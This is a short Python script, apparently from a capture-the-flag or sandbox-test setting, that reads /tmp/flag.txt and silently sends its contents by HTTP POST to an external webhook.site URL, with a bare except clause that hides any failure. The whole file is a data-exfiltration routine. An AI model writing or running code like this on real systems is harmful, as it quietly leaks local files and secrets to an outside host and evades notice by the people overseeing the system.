import requests


try:
    flag = open("/tmp/flag.txt").read()
    requests.post(
        "https://webhook.site/01234567-89ab-cdef-0123-456789abcdef/flag",
        data={"flag": flag},
    )
except Exception:
    pass
